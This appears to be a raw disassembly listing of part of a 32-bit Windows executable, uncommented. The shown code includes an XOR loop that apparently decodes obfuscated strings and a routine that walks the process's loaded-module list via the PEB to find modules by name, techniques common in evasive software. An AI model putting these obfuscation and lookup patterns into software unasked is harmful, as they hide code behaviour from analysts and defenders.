  401f47:	0f b6 1c 16          	movzbl (%esi,%edx,1),%ebx
  401f4b:	89 d6                	mov    %edx,%esi
  401f4d:	83 e6 0f             	and    $0xf,%esi
  401f50:	8b 7d ec             	mov    -0x14(%ebp),%edi
  401f53:	0f b6 34 37          	movzbl (%edi,%esi,1),%esi
  401f57:	8b 7d 08             	mov    0x8(%ebp),%edi
  401f5a:	83 7f 18 10          	cmpl   $0x10,0x18(%edi)
  401f5e:	89 c7                	mov    %eax,%edi
  401f60:	72 02                	jb     0x401f64
  401f62:	8b 38                	mov    (%eax),%edi
  401f64:	01 cb                	add    %ecx,%ebx
  401f66:	31 f3                	xor    %esi,%ebx
  401f68:	88 1c 17             	mov    %bl,(%edi,%edx,1)
  401f6b:	42                   	inc    %edx
  401f6c:	49                   	dec    %ecx
  401f6d:	3b 55 e4             	cmp    -0x1c(%ebp),%edx
  401f70:	72 c2                	jb     0x401f34
  401f72:	eb 06                	jmp    0x401f7a
  401f74:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401f78:	74 0e                	je     0x401f88
  401f7a:	83 ec 0c             	sub    $0xc,%esp
  401f7d:	ff 75 ec             	push   -0x14(%ebp)
  401f80:	e8 2b 3d 00 00       	call   0x405cb0
  401f85:	83 c4 10             	add    $0x10,%esp
  401f88:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401f8b:	83 f9 10             	cmp    $0x10,%ecx
  401f8e:	72 1b                	jb     0x401fab
  401f90:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401f93:	41                   	inc    %ecx
  401f94:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401f9a:	72 03                	jb     0x401f9f
  401f9c:	8b 40 fc             	mov    -0x4(%eax),%eax
  401f9f:	83 ec 0c             	sub    $0xc,%esp
  401fa2:	50                   	push   %eax
  401fa3:	e8 18 3d 00 00       	call   0x405cc0
  401fa8:	83 c4 10             	add    $0x10,%esp
  401fab:	83 ec 0c             	sub    $0xc,%esp
  401fae:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401fb4:	50                   	push   %eax
  401fb5:	e8 bc f1 01 00       	call   0x421176
  401fba:	83 c4 10             	add    $0x10,%esp
  401fbd:	8b 45 08             	mov    0x8(%ebp),%eax
  401fc0:	81 c4 ac 00 00 00    	add    $0xac,%esp
  401fc6:	5e                   	pop    %esi
  401fc7:	5f                   	pop    %edi
  401fc8:	5b                   	pop    %ebx
  401fc9:	5d                   	pop    %ebp
  401fca:	c3                   	ret
  401fcb:	c7 85 60 ff ff ff 04 	movl   $0x4,-0xa0(%ebp)
  401fd2:	00 00 00 
  401fd5:	83 ec 0c             	sub    $0xc,%esp
  401fd8:	68 30 25 42 00       	push   $0x422530
  401fdd:	e8 4a c5 00 00       	call   0x40e52c
  401fe2:	83 c4 0c             	add    $0xc,%esp
  401fe5:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  401feb:	3d 05 00 00 00       	cmp    $0x5,%eax
  401ff0:	76 02                	jbe    0x401ff4
  401ff2:	0f 0b                	ud2
  401ff4:	2d 01 00 00 00       	sub    $0x1,%eax
  401ff9:	ff 24 85 b4 20 40 00 	jmp    *0x4020b4(,%eax,4)
  402000:	eb 4f                	jmp    0x402051
  402002:	eb 4d                	jmp    0x402051
  402004:	8b b5 64 ff ff ff    	mov    -0x9c(%ebp),%esi
  40200a:	8b bd 68 ff ff ff    	mov    -0x98(%ebp),%edi
  402010:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402013:	83 f8 10             	cmp    $0x10,%eax
  402016:	72 23                	jb     0x40203b
  402018:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  40201b:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  40201e:	40                   	inc    %eax
  40201f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402024:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402027:	72 06                	jb     0x40202f
  402029:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40202c:	8b 40 fc             	mov    -0x4(%eax),%eax
  40202f:	83 ec 0c             	sub    $0xc,%esp
  402032:	50                   	push   %eax
  402033:	e8 88 3c 00 00       	call   0x405cc0
  402038:	83 c4 10             	add    $0x10,%esp
  40203b:	c7 45 b0 0f 00 00 00 	movl   $0xf,-0x50(%ebp)
  402042:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%ebp)
  402049:	c6 45 9c 00          	movb   $0x0,-0x64(%ebp)
  40204d:	eb 0e                	jmp    0x40205d
  40204f:	eb 00                	jmp    0x402051
  402051:	8b b5 64 ff ff ff    	mov    -0x9c(%ebp),%esi
  402057:	8b bd 68 ff ff ff    	mov    -0x98(%ebp),%edi
  40205d:	89 bd 54 ff ff ff    	mov    %edi,-0xac(%ebp)
  402063:	89 75 90             	mov    %esi,-0x70(%ebp)
  402066:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402069:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40206c:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40206f:	83 f8 10             	cmp    $0x10,%eax
  402072:	72 26                	jb     0x40209a
  402074:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402077:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40207a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40207d:	40                   	inc    %eax
  40207e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402083:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402086:	72 06                	jb     0x40208e
  402088:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40208b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40208e:	83 ec 0c             	sub    $0xc,%esp
  402091:	50                   	push   %eax
  402092:	e8 29 3c 00 00       	call   0x405cc0
  402097:	83 c4 10             	add    $0x10,%esp
  40209a:	8b 45 90             	mov    -0x70(%ebp),%eax
  40209d:	c7 85 60 ff ff ff ff 	movl   $0xffffffff,-0xa0(%ebp)
  4020a4:	ff ff ff 
  4020a7:	83 ec 0c             	sub    $0xc,%esp
  4020aa:	50                   	push   %eax
  4020ab:	e8 44 f0 01 00       	call   0x4210f4
  4020b0:	83 c4 0c             	add    $0xc,%esp
  4020b3:	90                   	nop
  4020b4:	00 20                	add    %ah,(%eax)
  4020b6:	40                   	inc    %eax
  4020b7:	00 02                	add    %al,(%edx)
  4020b9:	20 40 00             	and    %al,0x0(%eax)
  4020bc:	04 20                	add    $0x20,%al
  4020be:	40                   	inc    %eax
  4020bf:	00 4f 20             	add    %cl,0x20(%edi)
  4020c2:	40                   	inc    %eax
  4020c3:	00 51 20             	add    %dl,0x20(%ecx)
  4020c6:	40                   	inc    %eax
  4020c7:	00 55 89             	add    %dl,-0x77(%ebp)
  4020ca:	e5 53                	in     $0x53,%eax
  4020cc:	57                   	push   %edi
  4020cd:	56                   	push   %esi
  4020ce:	81 ec ac 00 00 00    	sub    $0xac,%esp
  4020d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4020d7:	c7 45 b8 0f 00 00 00 	movl   $0xf,-0x48(%ebp)
  4020de:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  4020e5:	c6 45 a4 00          	movb   $0x0,-0x5c(%ebp)
  4020e9:	89 44 24 04          	mov    %eax,0x4(%esp)
  4020ed:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4020f0:	89 04 24             	mov    %eax,(%esp)
  4020f3:	e8 fc 2d 00 00       	call   0x404ef4
  4020f8:	83 7d b8 0f          	cmpl   $0xf,-0x48(%ebp)
  4020fc:	8b 75 b4             	mov    -0x4c(%ebp),%esi
  4020ff:	77 05                	ja     0x402106
  402101:	8d 7d a4             	lea    -0x5c(%ebp),%edi
  402104:	eb 03                	jmp    0x402109
  402106:	8b 7d a4             	mov    -0x5c(%ebp),%edi
  402109:	c7 45 d8 07 00 00 00 	movl   $0x7,-0x28(%ebp)
  402110:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  402117:	66 c7 45 c4 00 00    	movw   $0x0,-0x3c(%ebp)
  40211d:	c7 45 84 ec 04 42 00 	movl   $0x4204ec,-0x7c(%ebp)
  402124:	c7 45 88 7c 25 42 00 	movl   $0x42257c,-0x78(%ebp)
  40212b:	89 6d 8c             	mov    %ebp,-0x74(%ebp)
  40212e:	89 65 94             	mov    %esp,-0x6c(%ebp)
  402131:	c7 45 8c 88 22 40 00 	movl   $0x402288,-0x74(%ebp)
  402138:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  40213e:	e8 12 f0 01 00       	call   0x421155
  402143:	83 fe 07             	cmp    $0x7,%esi
  402146:	74 4b                	je     0x402193
  402148:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40214b:	c7 85 70 ff ff ff 01 	movl   $0x1,-0x90(%ebp)
  402152:	00 00 00 
  402155:	89 75 ec             	mov    %esi,-0x14(%ebp)
  402158:	89 74 24 04          	mov    %esi,0x4(%esp)
  40215c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40215f:	89 04 24             	mov    %eax,(%esp)
  402162:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  402169:	00 
  40216a:	e8 f9 30 00 00       	call   0x405268
  40216f:	84 c0                	test   %al,%al
  402171:	8b 75 ec             	mov    -0x14(%ebp),%esi
  402174:	8b 7d f0             	mov    -0x10(%ebp),%edi
  402177:	74 1a                	je     0x402193
  402179:	83 7d d8 07          	cmpl   $0x7,-0x28(%ebp)
  40217d:	77 05                	ja     0x402184
  40217f:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402182:	eb 03                	jmp    0x402187
  402184:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402187:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  40218e:	66 c7 00 00 00       	movw   $0x0,(%eax)
  402193:	01 fe                	add    %edi,%esi
  402195:	c7 85 70 ff ff ff 02 	movl   $0x2,-0x90(%ebp)
  40219c:	00 00 00 
  40219f:	8a 45 e8             	mov    -0x18(%ebp),%al
  4021a2:	88 44 24 0c          	mov    %al,0xc(%esp)
  4021a6:	89 74 24 08          	mov    %esi,0x8(%esp)
  4021aa:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4021ae:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4021b1:	89 04 24             	mov    %eax,(%esp)
  4021b4:	e8 ab 2e 00 00       	call   0x405064
  4021b9:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  4021bf:	8b 40 0c             	mov    0xc(%eax),%eax
  4021c2:	8b 48 0c             	mov    0xc(%eax),%ecx
  4021c5:	83 79 18 00          	cmpl   $0x0,0x18(%ecx)
  4021c9:	74 58                	je     0x402223
  4021cb:	8d 51 18             	lea    0x18(%ecx),%edx
  4021ce:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4021d5:	00 00 00 
  4021d8:	8b 41 30             	mov    0x30(%ecx),%eax
  4021db:	83 7d d8 07          	cmpl   $0x7,-0x28(%ebp)
  4021df:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4021e2:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4021e5:	77 11                	ja     0x4021f8
  4021e7:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4021ea:	eb 0f                	jmp    0x4021fb
  4021ec:	66 66 66 2e 0f 1f 84 	data16 data16 nopw %cs:0x0(%eax,%eax,1)
  4021f3:	00 00 00 00 00 
  4021f8:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4021fb:	c7 85 70 ff ff ff 03 	movl   $0x3,-0x90(%ebp)
  402202:	00 00 00 
  402205:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  402209:	89 04 24             	mov    %eax,(%esp)
  40220c:	e8 07 fb 00 00       	call   0x411d18
  402211:	85 c0                	test   %eax,%eax
  402213:	74 12                	je     0x402227
  402215:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402218:	8b 09                	mov    (%ecx),%ecx
  40221a:	8d 51 18             	lea    0x18(%ecx),%edx
  40221d:	83 79 18 00          	cmpl   $0x0,0x18(%ecx)
  402221:	75 b5                	jne    0x4021d8
  402223:	31 f6                	xor    %esi,%esi
  402225:	eb 05                	jmp    0x40222c
  402227:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40222a:	8b 30                	mov    (%eax),%esi
  40222c:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40222f:	83 f9 08             	cmp    $0x8,%ecx
  402232:	72 1a                	jb     0x40224e
  402234:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402237:	8d 4c 09 02          	lea    0x2(%ecx,%ecx,1),%ecx
  40223b:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402241:	72 03                	jb     0x402246
  402243:	8b 40 fc             	mov    -0x4(%eax),%eax
  402246:	89 04 24             	mov    %eax,(%esp)
  402249:	e8 72 3a 00 00       	call   0x405cc0
  40224e:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  402251:	83 f9 10             	cmp    $0x10,%ecx
  402254:	72 17                	jb     0x40226d
  402256:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402259:	41                   	inc    %ecx
  40225a:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402260:	72 03                	jb     0x402265
  402262:	8b 40 fc             	mov    -0x4(%eax),%eax
  402265:	89 04 24             	mov    %eax,(%esp)
  402268:	e8 53 3a 00 00       	call   0x405cc0
  40226d:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  402273:	89 04 24             	mov    %eax,(%esp)
  402276:	e8 fb ee 01 00       	call   0x421176
  40227b:	89 f0                	mov    %esi,%eax
  40227d:	81 c4 ac 00 00 00    	add    $0xac,%esp
  402283:	5e                   	pop    %esi
  402284:	5f                   	pop    %edi
  402285:	5b                   	pop    %ebx
  402286:	5d                   	pop    %ebp
  402287:	c3                   	ret
  402288:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  40228e:	3d 03 00 00 00       	cmp    $0x3,%eax
  402293:	76 02                	jbe    0x402297
  402295:	0f 0b                	ud2
  402297:	2d 01 00 00 00       	sub    $0x1,%eax
  40229c:	ff 24 85 4c 23 40 00 	jmp    *0x40234c(,%eax,4)
  4022a3:	8b b5 74 ff ff ff    	mov    -0x8c(%ebp),%esi
  4022a9:	8b bd 78 ff ff ff    	mov    -0x88(%ebp),%edi
  4022af:	eb 4a                	jmp    0x4022fb
  4022b1:	8b b5 74 ff ff ff    	mov    -0x8c(%ebp),%esi
  4022b7:	8b bd 78 ff ff ff    	mov    -0x88(%ebp),%edi
  4022bd:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4022c0:	83 f8 08             	cmp    $0x8,%eax
  4022c3:	72 22                	jb     0x4022e7
  4022c5:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4022c8:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4022cb:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4022cf:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4022d4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4022d7:	72 06                	jb     0x4022df
  4022d9:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4022dc:	8b 40 fc             	mov    -0x4(%eax),%eax
  4022df:	89 04 24             	mov    %eax,(%esp)
  4022e2:	e8 d9 39 00 00       	call   0x405cc0
  4022e7:	c7 45 d8 07 00 00 00 	movl   $0x7,-0x28(%ebp)
  4022ee:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  4022f5:	66 c7 45 c4 00 00    	movw   $0x0,-0x3c(%ebp)
  4022fb:	89 bd 64 ff ff ff    	mov    %edi,-0x9c(%ebp)
  402301:	89 75 bc             	mov    %esi,-0x44(%ebp)
  402304:	8b 45 b8             	mov    -0x48(%ebp),%eax
  402307:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40230a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40230d:	83 f8 10             	cmp    $0x10,%eax
  402310:	72 22                	jb     0x402334
  402312:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402315:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402318:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40231b:	40                   	inc    %eax
  40231c:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402321:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402324:	72 06                	jb     0x40232c
  402326:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402329:	8b 40 fc             	mov    -0x4(%eax),%eax
  40232c:	89 04 24             	mov    %eax,(%esp)
  40232f:	e8 8c 39 00 00       	call   0x405cc0
  402334:	8b 45 bc             	mov    -0x44(%ebp),%eax
  402337:	c7 85 70 ff ff ff ff 	movl   $0xffffffff,-0x90(%ebp)
  40233e:	ff ff ff 
  402341:	89 04 24             	mov    %eax,(%esp)
  402344:	e8 ab ed 01 00       	call   0x4210f4
  402349:	83 ec 04             	sub    $0x4,%esp
  40234c:	a3 22 40 00 a3       	mov    %eax,0xa3004022
  402351:	22 40 00             	and    0x0(%eax),%al
  402354:	b1 22                	mov    $0x22,%cl
  402356:	40                   	inc    %eax
  402357:	00 55 89             	add    %dl,-0x77(%ebp)
  40235a:	e5 53                	in     $0x53,%eax
  40235c:	57                   	push   %edi
  40235d:	56                   	push   %esi
  40235e:	83 ec 6c             	sub    $0x6c,%esp
  402361:	8a 1d b8 5c 71 00    	mov    0x715cb8,%bl
  402367:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  40236e:	c7 45 bc 94 25 42 00 	movl   $0x422594,-0x44(%ebp)
  402375:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  402378:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40237b:	c7 45 c0 30 24 40 00 	movl   $0x402430,-0x40(%ebp)
  402382:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402385:	89 f8                	mov    %edi,%eax
  402387:	e8 c9 ed 01 00       	call   0x421155
  40238c:	84 db                	test   %bl,%bl
  40238e:	75 78                	jne    0x402408
  402390:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  402397:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40239e:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4023a2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4023a9:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4023ac:	89 34 24             	mov    %esi,(%esp)
  4023af:	c7 44 24 04 e0 20 42 	movl   $0x4220e0,0x4(%esp)
  4023b6:	00 
  4023b7:	e8 38 2b 00 00       	call   0x404ef4
  4023bc:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  4023c3:	89 74 24 04          	mov    %esi,0x4(%esp)
  4023c7:	c7 04 24 9c 5c 71 00 	movl   $0x715c9c,(%esp)
  4023ce:	e8 11 f9 ff ff       	call   0x401ce4
  4023d3:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4023d6:	83 f9 10             	cmp    $0x10,%ecx
  4023d9:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4023dc:	72 17                	jb     0x4023f5
  4023de:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4023e1:	41                   	inc    %ecx
  4023e2:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4023e8:	72 03                	jb     0x4023ed
  4023ea:	8b 40 fc             	mov    -0x4(%eax),%eax
  4023ed:	89 04 24             	mov    %eax,(%esp)
  4023f0:	e8 cb 38 00 00       	call   0x405cc0
  4023f5:	c7 04 24 a4 12 40 00 	movl   $0x4012a4,(%esp)
  4023fc:	e8 a7 a8 01 00       	call   0x41cca8
  402401:	c6 05 b8 5c 71 00 01 	movb   $0x1,0x715cb8
  402408:	83 3d b4 5c 71 00 0f 	cmpl   $0xf,0x715cb4
  40240f:	77 07                	ja     0x402418
  402411:	be a0 5c 71 00       	mov    $0x715ca0,%esi
  402416:	eb 06                	jmp    0x40241e
  402418:	8b 35 a0 5c 71 00    	mov    0x715ca0,%esi
  40241e:	89 3c 24             	mov    %edi,(%esp)
  402421:	e8 50 ed 01 00       	call   0x421176
  402426:	89 f0                	mov    %esi,%eax
  402428:	83 c4 6c             	add    $0x6c,%esp
  40242b:	5e                   	pop    %esi
  40242c:	5f                   	pop    %edi
  40242d:	5b                   	pop    %ebx
  40242e:	5d                   	pop    %ebp
  40242f:	c3                   	ret
  402430:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402433:	3d 01 00 00 00       	cmp    $0x1,%eax
  402438:	76 02                	jbe    0x40243c
  40243a:	0f 0b                	ud2
  40243c:	2d 01 00 00 00       	sub    $0x1,%eax
  402441:	ff 24 85 84 24 40 00 	jmp    *0x402484(,%eax,4)
  402448:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40244b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40244e:	83 f8 10             	cmp    $0x10,%eax
  402451:	72 1f                	jb     0x402472
  402453:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402456:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402459:	40                   	inc    %eax
  40245a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40245f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402462:	72 06                	jb     0x40246a
  402464:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402467:	8b 40 fc             	mov    -0x4(%eax),%eax
  40246a:	89 04 24             	mov    %eax,(%esp)
  40246d:	e8 4e 38 00 00       	call   0x405cc0
  402472:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402479:	89 34 24             	mov    %esi,(%esp)
  40247c:	e8 73 ec 01 00       	call   0x4210f4
  402481:	83 ec 04             	sub    $0x4,%esp
  402484:	48                   	dec    %eax
  402485:	24 40                	and    $0x40,%al
  402487:	00 55 89             	add    %dl,-0x77(%ebp)
  40248a:	e5 53                	in     $0x53,%eax
  40248c:	57                   	push   %edi
  40248d:	56                   	push   %esi
  40248e:	83 ec 6c             	sub    $0x6c,%esp
  402491:	8a 1d d8 5c 71 00    	mov    0x715cd8,%bl
  402497:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  40249e:	c7 45 bc a4 25 42 00 	movl   $0x4225a4,-0x44(%ebp)
  4024a5:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  4024a8:	89 65 c8             	mov    %esp,-0x38(%ebp)
  4024ab:	c7 45 c0 60 25 40 00 	movl   $0x402560,-0x40(%ebp)
  4024b2:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4024b5:	89 f8                	mov    %edi,%eax
  4024b7:	e8 99 ec 01 00       	call   0x421155
  4024bc:	84 db                	test   %bl,%bl
  4024be:	75 78                	jne    0x402538
  4024c0:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4024c7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4024ce:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4024d2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4024d9:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4024dc:	89 34 24             	mov    %esi,(%esp)
  4024df:	c7 44 24 04 23 21 42 	movl   $0x422123,0x4(%esp)
  4024e6:	00 
  4024e7:	e8 08 2a 00 00       	call   0x404ef4
  4024ec:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  4024f3:	89 74 24 04          	mov    %esi,0x4(%esp)
  4024f7:	c7 04 24 bc 5c 71 00 	movl   $0x715cbc,(%esp)
  4024fe:	e8 e1 f7 ff ff       	call   0x401ce4
  402503:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402506:	83 f9 10             	cmp    $0x10,%ecx
  402509:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  40250c:	72 17                	jb     0x402525
  40250e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402511:	41                   	inc    %ecx
  402512:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402518:	72 03                	jb     0x40251d
  40251a:	8b 40 fc             	mov    -0x4(%eax),%eax
  40251d:	89 04 24             	mov    %eax,(%esp)
  402520:	e8 9b 37 00 00       	call   0x405cc0
  402525:	c7 04 24 f4 12 40 00 	movl   $0x4012f4,(%esp)
  40252c:	e8 77 a7 01 00       	call   0x41cca8
  402531:	c6 05 d8 5c 71 00 01 	movb   $0x1,0x715cd8
  402538:	83 3d d4 5c 71 00 0f 	cmpl   $0xf,0x715cd4
  40253f:	77 07                	ja     0x402548
  402541:	be c0 5c 71 00       	mov    $0x715cc0,%esi
  402546:	eb 06                	jmp    0x40254e
  402548:	8b 35 c0 5c 71 00    	mov    0x715cc0,%esi
  40254e:	89 3c 24             	mov    %edi,(%esp)
  402551:	e8 20 ec 01 00       	call   0x421176
  402556:	89 f0                	mov    %esi,%eax
  402558:	83 c4 6c             	add    $0x6c,%esp
  40255b:	5e                   	pop    %esi
  40255c:	5f                   	pop    %edi
  40255d:	5b                   	pop    %ebx
  40255e:	5d                   	pop    %ebp
  40255f:	c3                   	ret
  402560:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402563:	3d 01 00 00 00       	cmp    $0x1,%eax
  402568:	76 02                	jbe    0x40256c
  40256a:	0f 0b                	ud2
  40256c:	2d 01 00 00 00       	sub    $0x1,%eax
  402571:	ff 24 85 b4 25 40 00 	jmp    *0x4025b4(,%eax,4)
  402578:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40257b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40257e:	83 f8 10             	cmp    $0x10,%eax
  402581:	72 1f                	jb     0x4025a2
  402583:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402586:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  402589:	40                   	inc    %eax
  40258a:	3d 00 10 00 00       	cmp    $0x1000,%eax
  40258f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402592:	72 06                	jb     0x40259a
  402594:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402597:	8b 40 fc             	mov    -0x4(%eax),%eax
  40259a:	89 04 24             	mov    %eax,(%esp)
  40259d:	e8 1e 37 00 00       	call   0x405cc0
  4025a2:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4025a9:	89 34 24             	mov    %esi,(%esp)
  4025ac:	e8 43 eb 01 00       	call   0x4210f4
  4025b1:	83 ec 04             	sub    $0x4,%esp
  4025b4:	78 25                	js     0x4025db
  4025b6:	40                   	inc    %eax
  4025b7:	00 55 89             	add    %dl,-0x77(%ebp)
  4025ba:	e5 53                	in     $0x53,%eax
  4025bc:	57                   	push   %edi
  4025bd:	56                   	push   %esi
  4025be:	83 ec 6c             	sub    $0x6c,%esp
  4025c1:	8a 1d f8 5c 71 00    	mov    0x715cf8,%bl
  4025c7:	c7 45 b8 ec 04 42 00 	movl   $0x4204ec,-0x48(%ebp)
  4025ce:	c7 45 bc b4 25 42 00 	movl   $0x4225b4,-0x44(%ebp)
  4025d5:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  4025d8:	89 65 c8             	mov    %esp,-0x38(%ebp)
  4025db:	c7 45 c0 90 26 40 00 	movl   $0x402690,-0x40(%ebp)
  4025e2:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4025e5:	89 f8                	mov    %edi,%eax
  4025e7:	e8 69 eb 01 00       	call   0x421155
  4025ec:	84 db                	test   %bl,%bl
  4025ee:	75 78                	jne    0x402668
  4025f0:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4025f7:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4025fe:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402602:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  402609:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  40260c:	89 34 24             	mov    %esi,(%esp)
  40260f:	c7 44 24 04 60 21 42 	movl   $0x422160,0x4(%esp)
  402616:	00 
  402617:	e8 d8 28 00 00       	call   0x404ef4
  40261c:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402623:	89 74 24 04          	mov    %esi,0x4(%esp)
  402627:	c7 04 24 dc 5c 71 00 	movl   $0x715cdc,(%esp)
  40262e:	e8 b1 f6 ff ff       	call   0x401ce4
  402633:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402636:	83 f9 10             	cmp    $0x10,%ecx
  402639:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  40263c:	72 17                	jb     0x402655
  40263e:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402641:	41                   	inc    %ecx
  402642:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402648:	72 03                	jb     0x40264d
  40264a:	8b 40 fc             	mov    -0x4(%eax),%eax
  40264d:	89 04 24             	mov    %eax,(%esp)
  402650:	e8 6b 36 00 00       	call   0x405cc0
  402655:	c7 04 24 44 13 40 00 	movl   $0x401344,(%esp)
  40265c:	e8 47 a6 01 00       	call   0x41cca8
  402661:	c6 05 f8 5c 71 00 01 	movb   $0x1,0x715cf8
  402668:	83 3d f4 5c 71 00 0f 	cmpl   $0xf,0x715cf4
  40266f:	77 07                	ja     0x402678
  402671:	be e0 5c 71 00       	mov    $0x715ce0,%esi
  402676:	eb 06                	jmp    0x40267e
  402678:	8b 35 e0 5c 71 00    	mov    0x715ce0,%esi
  40267e:	89 3c 24             	mov    %edi,(%esp)
